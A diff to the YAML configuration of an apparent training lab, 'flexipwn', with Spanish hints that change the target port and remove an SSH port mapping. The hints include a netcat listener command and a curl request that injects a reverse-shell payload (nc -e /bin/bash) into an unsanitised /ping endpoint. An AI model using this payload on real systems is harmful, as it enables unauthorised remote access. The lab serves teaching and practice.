@@ -12,14 +12,12 @@ environment:
   attacker_image: "flexipwn-attacker"
   log_paths: []
   ports: []
-  attacker_ports:
-    - "2222:22"
   startup_delay_seconds: 3.0
 
 hints:
   - "El env_id se muestra al iniciar el run. Los contenedores se llaman flexipwn-{env_id}-vulnerable y flexipwn-{env_id}-attacker dentro de la red interna."
   - "Primero entra al atacante por SSH (puerto expuesto en la CLI) y abre un listener: nc -lvp 4444"
-  - "Desde el atacante, envía el payload al vulnerable: curl 'http://flexipwn-{env_id}-vulnerable:5000/ping?host=;nc+flexipwn-{env_id}-attacker+4444+-e+/bin/bash'"
+  - "Desde el atacante, envía el payload al vulnerable: curl 'http://flexipwn-{env_id}-vulnerable:5001/ping?host=;nc+flexipwn-{env_id}-attacker+4444+-e+/bin/bash'"
   - "El endpoint /ping ejecuta el comando sin sanitizar"
 
 targets:
